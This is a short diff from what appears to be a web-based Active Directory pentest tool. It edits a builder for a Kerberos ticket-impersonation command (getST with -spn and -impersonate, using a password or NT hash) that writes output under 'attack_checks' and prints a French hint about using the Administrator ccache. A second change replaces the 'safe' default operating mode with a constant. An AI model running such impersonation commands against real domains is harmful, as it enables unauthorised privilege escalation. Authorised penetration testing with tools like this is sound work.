-                  + (f"-hashes {shell_quote(':' + nt)}" if nt else f"-p {qp}")
-                  + f" {shell_quote(f'{d}/{u}')} -dc-ip {qt} 2>&1")
+                  f"$TOOL -spn \"$SPN_TARGET\" -impersonate \"$IMPERSONATE\" -dc-ip {qt} "
+                  + (f"-hashes {shell_quote(':' + nt)} {shell_quote(f'{d}/{u}')}" if nt else
+                     f"{shell_quote(f'{d}/{u}:{p}')}")
+                  + f" 2>&1")
                + f" | tee {qout}/attack_checks/getST.txt; "
                f"echo ''; echo '--- Utilise le ccache genere : export KRB5CCNAME=Administrator@http_...ccache ---'"
                if u else "echo 'Credentials requis pour getST'")
@@ -4786,7 +5891,7 @@ async def ws_endpoint(ws: WebSocket):
                 existing = load_saved_config()
                 reset_cfg = {
                     "target_type": existing.get("target_type") or "windows",
-                    "op_mode": existing.get("op_mode") or "safe",
+                    "op_mode": existing.get("op_mode") or DEFAULT_OP_MODE,
                     "target": "",
                     "domain": "",
                     "dc": "",
